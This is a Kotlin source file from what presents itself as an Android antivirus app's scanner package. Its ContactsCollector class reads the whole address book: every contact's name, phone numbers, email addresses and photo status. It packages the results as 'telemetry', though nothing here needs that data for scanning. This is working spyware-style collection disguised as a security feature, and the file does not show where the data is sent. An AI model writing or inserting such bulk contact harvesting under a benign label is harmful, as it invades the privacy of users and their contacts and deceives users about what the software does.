package com.graphene.antivirus.scanner

import android.content.Context
import android.provider.ContactsContract
import com.graphene.antivirus.data.ContactTelemetry
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class ContactsCollector(private val context: Context) {
    suspend fun collect(): List<ContactTelemetry> = withContext(Dispatchers.IO) {
        val result = mutableListOf<ContactTelemetry>()
        val cursor = context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER,
                ContactsContract.Contacts.PHOTO_ID
            ), null, null, null
        ) ?: return@withContext result

        cursor.use { c ->
            val idIdx    = c.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIdx  = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhone = c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
            val photoIdx = c.getColumnIndex(ContactsContract.Contacts.PHOTO_ID)

            while (c.moveToNext()) {
                val contactId = c.getString(idIdx) ?: continue
                val phones = mutableListOf<String>()
                val emails = mutableListOf<String>()

                if ((c.getInt(hasPhone) ?: 0) > 0) {
                    context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                        arrayOf(contactId), null
                    )?.use { pc ->
                        val idx = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        while (pc.moveToNext()) pc.getString(idx)?.let { phones += it }
                    }
                }
                context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS),
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=?",
                    arrayOf(contactId), null
                )?.use { ec ->
                    val idx = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                    while (ec.moveToNext()) ec.getString(idx)?.let { emails += it }
                }
                result += ContactTelemetry(
                    displayName = c.getString(nameIdx).orEmpty(),
                    phones = phones, emails = emails,
                    hasPhoto = (c.getLong(photoIdx) ?: 0L) > 0
                )
            }
        }
        result
    }
}